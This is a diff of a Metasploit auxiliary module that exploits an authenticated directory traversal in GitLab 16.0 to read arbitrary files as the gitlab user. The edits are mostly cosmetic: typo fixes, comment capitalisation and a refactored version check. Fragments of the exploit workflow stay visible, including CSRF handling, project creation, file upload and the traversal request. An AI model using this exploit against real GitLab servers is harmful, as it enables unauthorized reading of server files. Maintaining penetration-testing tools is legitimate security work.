@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'GitLab Authenticated File Read',
         'Description' => %q{
-          Gitlab version 16.0 contains a directory traversal for arbitrary file read as the gitlab user.
+          Gitlab version 16.0 contains an authenticated directory traversal for arbitrary file read as the gitlab user.
           In order to exploit this vulnerability, a user must be able to create a project and groups.
           When exploiting this vulnerability, a group (or subgroup under the group) must be created
           for each level of the traversal. If the depth is 11 for the dir traversal, then a group
@@ -25,13 +25,11 @@ class MetasploitModule < Msf::Auxiliary
           With all these requirements satisfied a dummy file is uploaded, and the full
           traversal is then executed. Cleanup is performed by deleting the first group which
           cascades to deleting all other objects created.
-
-          Tested on Docker image of gitlab 16.0
         },
         'Author' => [
-          'h00die', # msf module
-          'pwnie', # discovery on hackerone
-          'Vitellozzo', # PoC on github
+          'h00die', # MSF module
+          'pwnie', # Discovery on HackerOne
+          'Vitellozzo' # PoC on Github
         ],
         'References' => [
           ['URL', 'https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/'],
@@ -73,9 +71,9 @@ class MetasploitModule < Msf::Auxiliary
 
     version = Rex::Version.new(gitlab_version)
 
-    return CheckCode::Safe("Detected GitLab version #{version} which is not vulnerable") unless (
-      version == Rex::Version.new('16.0.0')
-    )
+    if version != Rex::Version.new('16.0.0')
+      return CheckCode::Safe("Detected GitLab version #{version} which is not vulnerable")
+    end
 
     report_vuln(
       host: rhost,
@@ -83,6 +81,7 @@ class MetasploitModule < Msf::Auxiliary
       refs: references,
       info: [version]
     )
+
     return Exploit::CheckCode::Appears("Detected GitLab version #{version} which is vulnerable.")
   rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
     return Exploit::CheckCode::Detected('Could not detect the version because authentication failed.')
@@ -97,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path)
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
+    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
     csrf_token = get_csrf(res.body)
     vprint_good("CSRF Token: #{csrf_token}")
 
@@ -124,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
       fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
+      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
       csrf_token = get_csrf(res.body)
       vprint_good("CSRF Token: #{csrf_token}")
 
@@ -152,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 302
+    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302
     csrf_token = get_csrf(res.body)
 
     project_id = res.headers['Location'].to_s.split('/')[3..].join('/') # strip off http[s]://ip/, seems like there should be a better way to do this though
@@ -180,7 +179,7 @@ class MetasploitModule < Msf::Auxiliary
       ]
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 200
+    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
     res = res.get_json_document
     file_url = res['link']['url']
     # remove our file name
@@ -200,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
     if res.code == 500
       print_error("Unable to read file (permissions, or file doens't exist)")
     elsif res.code != 200
-      print_error("#{peer} - Unexpected Respones Code (response code: #{res.code})") # don't fail_with so we can cleanup
+      print_error("#{peer} - Unexpected response code (#{res.code})") # don't fail_with so we can cleanup
     end
 
     if !res.body.empty? && res.code == 200
@@ -224,6 +223,6 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Respones Code (response code: #{res.code})") unless res.code == 302
+    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302
   end
 end
